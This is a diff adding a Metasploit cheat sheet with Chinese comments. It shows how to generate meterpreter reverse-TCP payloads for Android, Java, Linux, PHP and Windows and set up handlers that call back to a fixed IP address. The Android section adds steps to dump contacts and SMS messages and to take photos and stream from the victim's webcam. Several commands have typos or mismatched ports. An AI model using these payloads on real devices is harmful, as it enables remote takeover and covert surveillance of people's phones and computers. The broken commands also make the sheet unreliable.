@@ -1,0 +1,60 @@
+#android:
+msfpayload android/meterpreter/reverse_tcp LHOST=192.168.2.133 LPORT=1213 R >/root/desktop/apk.apk
+
+use exploit/mutli/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST 192.168.2.133
+set LPORT 1123
+explot
+		dump_contacts #--导出电话
+		dump_sms #--导出信息
+		Webcam_list  #可以看到有几个摄像头
+		-i 1 #选择后摄像头
+		webcam_snap #拍照
+		webcam_stream  #开启摄像头
+
+#java：
+msfpayload java/meterpreter/reverse_tcp HOST=192.168.2.133 LPORT=1125 X > 123.jar
+
+msf
+use exploit/multil/handler
+set payload java/meterpreter/reverse_tcp
+set LHOST 192.168.2.133
+set LPORT 1125
+exploit
+
+
+#linux:
+msfpayload linux/x86/meterpreter/reverse_tcp  LHOST=192.168.2.133 LPORT=1122 X > /root/linux
+
+msf
+use exploit/multi/handler
+set payload linux/x86/meterpreter/reverse_tcp
+set LHOST 192.168.2.133
+set LPORT 1122
+exploit
+
+#php:
+msfpayload php/meterpreter/reverse_tcp LHOST=192.168.2.133 LPORT=1126 R > 123.php
+
+msf
+use exploit/multi/handler
+set payload php/meterpreter/reverse_tcp
+set LHOST 192.168.2.133
+set LPORT 1126
+exploit
+
+
+
+#windows：
+msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.2.133 LPORT=1121 X > /root/text.exe  #生成shellcode
+
+msf
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.2.133
+set LPORT 1121
+exploit   #->[里面可以输入：shell,ipconfig]  #侦听shellcode:
+#[msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=192.168.2.133 LPORT=1211 E  第二种使用方法，和上面效果一样]
+
+
